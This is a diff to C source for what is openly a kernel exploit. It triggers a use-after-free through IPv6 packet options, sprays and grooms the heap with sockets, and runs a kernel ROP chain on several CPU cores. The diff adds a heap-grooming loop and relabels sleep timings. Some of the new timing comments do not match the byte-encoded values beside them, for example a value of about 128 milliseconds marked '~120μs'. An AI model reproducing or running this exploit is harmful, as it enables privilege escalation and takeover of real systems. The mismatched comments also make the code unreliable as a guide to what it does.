@@ -103,7 +103,7 @@ void* free_thread(void* arg) {
     while (!o->triggered && get_tclass_3(o->master_sock) != TCLASS_SPRAY) {
         if (free_pktopts(o->master_sock))
             *(volatile int*)0;
-        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100us
+        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // ~100μs
     }
 
     o->triggered = 1;
@@ -128,7 +128,7 @@ void trigger_uaf(struct opaque* o) {
             if (free_pktopts(o->spray_sock[i]))
                 *(volatile int*)0;
 
-        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL);
+        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // ~100μs
     }
 
     o->triggered = 1;
@@ -258,6 +258,14 @@ int main() {
     int kevent_sock = new_socket();
     int master_sock = new_socket();
     krop_master_sock = master_sock * 8;
+	
+	// Prepare pre heap grooming 
+	for(int i = 0; i < 50; i++) {  
+		int temp_sock = new_socket();  
+		reset_ipv6_opts(temp_sock);  
+		close(temp_sock);  
+		nanosleep("\0\0\0\0\0\0\0\0\x38\x2a\x01\0\0\0\0\0", NULL); // ~75 μs
+	}  
 
     int spray_sock[SPRAY_TOTAL];
     for (int i = 0; i < SPRAY_TOTAL; i++) {
@@ -272,7 +280,7 @@ int main() {
         .spray_sock = spray_sock
     };
 
-    // The enter_krop chain is only executed after trigger_uaf() and fake_pktopts() is validated
+    // The kernel exploit is only executed after trigger_uaf() and fake_pktopts() validation
     for (int attempts = 0; attempts < 10; attempts++) {
         int overlap_idx = -1;
         for (int i = 0; i < SPRAY_SIZE; i++) {
@@ -335,8 +343,9 @@ int main() {
     setsockopt(master_sock, IPPROTO_IPV6, IPV6_TCLASS, &zero, sizeof(zero));
     shutdown(master_sock, SHUT_RDWR);
 
-    nanosleep("\0\0\0\0\0\0\0\0\x00\x00\xA0\x86\01\0\0\0", NULL);
-    break; // Successful exploit run ROP Chain
+    nanosleep("\0\0\0\0\0\0\0\0\x00\x00\xA0\x86\01\0\0\0", NULL); // ~100μs
+	
+    break; // Successful exploit run spray ROP chain
     }
 	
     // Map spray to ROP execution
@@ -360,10 +369,10 @@ int main() {
 
     for (int cpu = 2; cpu <= 7; cpu++) {
         pin_to_cpu(cpu);
-        rop_call_funcptr(spray_map, NULL, kernel_base); // Remaining cores for malloc sprays (Heap Grooming)
+        rop_call_funcptr(spray_map, NULL, kernel_base); // Remaining cores for malloc sprays 
     }
 
-    nanosleep("\0\0\0\0\0\0\0\0\x00\x00\xA0\x86\01\0\0\0", NULL); // ~100ms
+    nanosleep("\0\0\0\0\0\0\0\0\x00\x00\xA0\x86\01\0\0\0", NULL); // ~100μs
 
     struct in6_pktinfo safe = {0};
     set_pktinfo(master_sock, (char*)&safe);
@@ -377,7 +386,7 @@ int main() {
     close(master_sock);
     munmap(spray_map, spray_size);
 
-    nanosleep("\0\0\0\0\0\0\0\0\x00\x00\x20\xA1\07\0\0\0", NULL); // Safety exit
+    nanosleep("\0\0\0\0\0\0\0\0\x00\x00\x20\xA1\07\0\0\0", NULL); // ~120μs
 
 	return 0;
 }
